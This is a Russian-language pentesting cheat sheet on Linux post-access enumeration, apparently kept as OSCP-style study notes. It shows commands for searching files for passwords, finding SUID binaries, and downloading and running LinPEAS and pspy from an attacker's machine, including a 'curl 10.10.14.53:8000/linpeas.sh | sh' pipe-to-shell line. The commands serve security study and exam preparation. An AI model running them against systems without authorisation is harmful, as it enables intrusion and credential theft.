
# Linux Enumeration

## Проверка вашего статуса

```bash
┌──(mac㉿kali)-[~]
└─$ whoami
mac
```

или используйте `id`, чтобы увидеть больше информации о вашем `uid` и группах, в которые вы входите:

```bash
┌──(mac㉿kali)-[~]
└─$ id
uid=1000(mac) gid=1000(mac) groups=1000(mac),27(sudo)
```

## Проверка других людей
Чтобы увидеть список пользователей в системе, прочитайте файл `/etc/passwd`:

```bash
$ cat /etc/passwd
```

Многие из этих пользователей связаны с определенными сервисами и не являются реальными людьми. Ищите реальных пользователей, фильтруя по тех, у кого есть реальный логиновый сокет:

```bash
$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
mac:x:1000:1000:Mac,,,:/home/mac:/bin/bash
```

## Проверка информации о ядре

```bash
┌──(mac㉿kali)-[~]
└─$ uname -a
Linux kali 5.10.0-kali5-amd64 #1 SMP Debian 5.10.24-1kali1 (2021-03-23) x86_64 GNU/Linux
```

**Что это означает?**

Ядро является центральной частью операционной системы. Эта команда сообщает вам о дистрибуции (Kali Linux), версии и размере слов (`x86_64`, то есть 64-битный)

## Чтение всех файлов
Эта команда объединяет содержимое любых читаемых файлов в текущей рабочей директории:

```bash
$ cat */*
```

Ее можно сочетать с `grep`, чтобы искать пароли, например:

```bash
$ cat */* | grep pass
```

Однако она не особенно эффективна при большом количестве файлов — попробуйте использовать ее в определенной директории

## Команда Find

Ищите файлы по владельцу пользователя (со ссылки [на этот пост](https://unix.stackexchange.com/questions/22747/finding-files-by-their-owner-and-file-permissions)):

```bash
$ find / -user userX
```

Ищите файлы по группе владельца (со ссылки [на этот пост](https://unix.stackexchange.com/questions/159244/find-files-belonging-to-a-group)):

```bash
$ find / -group groupX
```
  
Ищите конфигурационные файлы и перенаправляйте ошибки:

```bash
$ find / -name '*.conf' 2>/dev/null
```

Ищите suid-файлы:

```bash
$ find . -perm /4000
```

Исключить имя файла или другой запрос с помощью оператора `-not` или `!`:

```bash
$ find . -not -name "*.exe"

#исключить директории и файлы, начинающиеся с "sys"
$ find /var ! -name "sys*" ! -type d
```

Как всегда, фильтруйте вывод с помощью `grep`, если ваша команда Find недостаточно детализирована:

```bash
# что-то с имями "backup"
$ find / -type f | grep backup

# избавиться от вещей из /proc и /var/lib
$ find / -user user | grep -v 'proc\|var/lib'

# избавиться от сообщений об ошибках (полезно, если оператор > не работает в сокете)
$ find / -user user | grep -v 'Permission denied'
```

Вы даже можете использовать регулярные выражения в своей команде Find с флагом `-regex`:

```bash
$ find ./ ! -regex  '.*\(deb\|vmdk\)$'
```

Или использовать логические операторы, такие как `-o` (логический OR):
```bash
$ find /media/d/ -type f -size +50M ! \( -name "*deb" -o -name "*vmdk" \)
```
(bольшая часть вышеупомянутых примеров из https://unix.stackexchange.com/questions/50612/how-to-combine-2-name-conditions-in-find#)

## Linpeas
Установите Linpeas с [GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

--

**ВАЖНОЕ АДЖИРНЕНИЕ:** 22/04/21 @\_superhero1 на Twitter объявил, что они [провалили OSCP](https://twitter.com/_superhero1/status/1385206684109447168) из-за автоматического эксплойта Linpeas относительно токенов sudo. Они в конце концов получили аннулированные баллы, но OffSec ясно дал понять, что в будущем они не будут строгими. Проблемный автоматический эксплойт [было удалено](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues/125), но вы должны убедиться, что используете [исправленную версию](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/commit/14601ecd35585537f0fe0041e411ecff0fcd27a8) LinPeas, которая [была подтверждена](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/) OffSec:

--

Помещение `linpeas.sh` в `~/Documents/enum` позволяет легко получить его с помощью простого python-сервера. Смотрите [[Aliases#Useful Aliases|Useful Aliases]] для инструкций по настройке alias для enumserve.

На компьютере атакующего:

```bash
$ enumserve
```

Найдите свой IP-адрес ([[Linux Networking#Get your IP]])

На компьютере цели:

```bash
$ wget [IP]:8000/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

Вы также можете отправить его напрямую в `sh`/`bash`, если `wget` не установлен:

```bash
$ curl 10.10.14.53:8000/linpeas.sh | sh
```

Иногда правила файрвола могут мешать доступу к порту 8000 — попробуйте запустить сервер на порту 80, если не получаете результатов (требует root-права):

```bash
$ sudo python3 -m http.server 80
```

## Стандартные директории для проверки
```
/home
/var/www
/var/backups
/var/logs
/opt
/usr/share
/usr/share/local
```

## Список процессов и сервисов
Список процессов:

```bash
$ ps aux
```

Мониторинг Pspy:

```bash
$ wget [IP]:8000/pspy64
$ chmod +x pspy64
$ ./pspy64
```

Список сервисов:

```bash
$ netstat
```

```bash
$ ss -lntp
```

```bash
$ systemctl list-units --type=service --state=running
```

**Почему это полезно?**

- Она позволяет увидеть, что может работать на системе — и, следовательно, что может быть уязвимым процессом или сервисом
- Она дает подсказки о цели/роли пользователя или системы
- Она может помочь выявить процессы, принадлежащие более высокоправильным пользователям

# Tags

#cheat-sheet #enum #unix 
